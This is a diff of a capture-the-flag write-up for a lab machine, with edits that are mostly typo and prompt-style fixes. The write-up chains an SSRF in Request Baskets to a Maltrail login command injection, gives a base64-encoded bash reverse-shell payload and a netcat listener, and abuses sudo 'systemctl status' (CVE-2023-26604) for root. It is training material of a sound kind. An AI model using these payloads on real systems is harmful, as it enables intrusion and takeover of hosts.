@@ -22,7 +22,8 @@ difficulty: Easy
 as usual I started with a full tcp scan 
 
 ```bash
-tr3m0x@blackhat$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.55.7 -oN nmap/tcp_scan.nmap 
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.55.7 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 17:48 CET
 Nmap scan report for 10.129.55.7
 Host is up, received reset ttl 63 (0.14s latency).
@@ -109,18 +110,19 @@ Nmap done: 1 IP address (1 host up) scanned in 105.63 seconds
 ### SSRF on Request Baskets
 
 the scan revealed important information as we can see we have 2 open ports and 2 filtered ports.<br>
-My next move was to check what is running on port 55555 so i opened the url in my browser. 
+My next move was to check what is running on port 55555 so I opened the URL in my browser.
 
 ![request_baskets page](./assets/request_baskets.png)
 
-before looking for anything I started testing for common things when i found soemting that accepts urls teh first things that<br>
+before looking for anything I started testing for common things when I found soemting that accepts urls the first things that<br>
 comes to my mind is ssrf . After creating a basket and clicking on the settings button I found this 
 ![forward url](./assets/forward_url.png)
 
-as we can see in the **Forward URL:** field we can put a url where our basket will forward the requests and acts as proxy. so i runned a python server locally and put my server url in the field and selected the **Proxy Response** option and sent a request to the basket. 
+as we can see in the **Forward URL:** field we can put a url where our basket will forward the requests and acts as proxy. so i ran a python server locally and put my server url in the field and selected the **Proxy Response** option and sent a request to the basket. 
 
 ```bash
-tr3m0x@blackhat$ curl http://10.129.55.7:55555/p0o77bz
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ curl http://10.129.55.7:55555/p0o77bz
 <!DOCTYPE HTML>
 <html lang="en">
     <head>
@@ -137,7 +139,8 @@ tr3m0x@blackhat$ curl http://10.129.55.7:55555/p0o77bz
 ```
 
 ```bash
-tr3m0x@blackhat$ python3 -m http.server 8080
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.129.55.7 - - [30/Aug/2026 18:11:46] code 404, message File not found
 10.129.55.7 - - [30/Aug/2026 18:11:46] "GET /test HTTP/1.1" 404 -
@@ -156,34 +159,37 @@ you can read more about it [here](https://medium.com/@li_allouche/request-basket
 
 ## Shell as puma
 
-okay so now we have ssrf vulnerability we can use it to access the filtred port 80 shown in the nmap scan. so i created a new basket and put the **Forward URL:** field to `127.0.0.1`and selected the **Proxy Response** option and sent a request to the basket and saved the html.
+okay so now we have ssrf vulnerability we can use it to access the filtered port 80 shown in the nmap scan. so i created a new basket and put the **Forward URL:** field to `127.0.0.1`and selected the **Proxy Response** option and sent a request to the basket and saved the html.
 
 ```bash
-tr3m0x@blackhat$ curl http://10.129.55.7:55555/p0o77bz > index.html
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ curl http://10.129.55.7:55555/p0o77bz > index.html
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  7091    0  7091    0     0  22100      0 --:--:-- --:--:-- --:--:-- 22159
 ```
-then opened the file in the browser and found maltrail (v0.53) instance running on port 80.<br>
+Then I opened the file in the browser and found a Maltrail (v0.53) instance running on port 80.<br>
 ![maltrail](./assets/maltrail.png)
 
 A simple google search showed that this version is vulnerable to command injection in the **/login** endpoint in the **username** field.<br>
 so I change the **Forward URL:** field to `http://127.0.0.1/login` and sent a post request to the basket . I used time command to detect if the command injection is working or not by sending a sleep command in the username field.
 
 ```bash
-tr3m0x@blackhat$ time curl http://10.129.55.7:55555/p0o77bz --data "username=test"
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ time curl http://10.129.55.7:55555/p0o77bz --data "username=test"
 Login failed
 real	0m5.441s
 user	0m0.003s
 sys	0m0.009s
-tr3m0x@blackhat$ time curl http://10.129.55.7:55555/p0o77bz --data "username=;`sleep 10`#"
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ time curl http://10.129.55.7:55555/p0o77bz --data "username=;`sleep 10`#"
 Login failed
 real	0m15.302s
 user	0m0.007s
 sys	0m0.011s
 ```
 
-and jackpot it seems to be working so now we can get a reverse shell by sending a payload in the username field. I used the following payload to get a reverse shell.
+And jackpot—it seems to be working. Now we can get a reverse shell by sending a payload in the username field. I used the following payload to get a reverse shell.
 
 ```text
 username=test;`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjQ3LzQ0NDQgMD4mMQ==| base64 -d | bash`
@@ -191,7 +197,8 @@ username=test;`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjQ3LzQ0NDQgMD4m
 
 and we got a reverse shell as user **puma**.
 ```bash
-tr3m0x@blackhat$ nc -lnvp 4444
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ nc -lnvp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.129.55.7 47238
 bash: cannot set terminal process group (880): Inappropriate ioctl for device
@@ -210,21 +217,21 @@ Matching Defaults entries for puma on sau:
 User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
-we can run systemctl status trail.service as root without password . then i checked the systemctl version
+We can run it as root without password. Then I checked the systemctl version.
 ```bash
 puma@sau:~$ systemctl --version 
 systemd 245 (245.4-4ubuntu3.22)
 ```
 
 ### About CVE-2023-26604
-after some research i find out that this version is vulnerable to **CVE-2023-26604**.
+After some research, I found out that this version is vulnerable to **CVE-2023-26604**.
 
 >**Description:**
 >systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.
 
 you can read more about it [here](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)
 
-in simple terms since the feature of using **less** pager to log the output of systemctl status instead of **cat** and since we can run commands with **less** we can get a root shell by running the following command.
+In simple terms, since the feature uses the **less** pager to log the output of `systemctl status` instead of `cat`, and since we can run commands with `less`, we can get a root shell by running the following command.
 
 ```bash
 puma@sau:~$ sudo /usr/bin/systemctl status trail.service
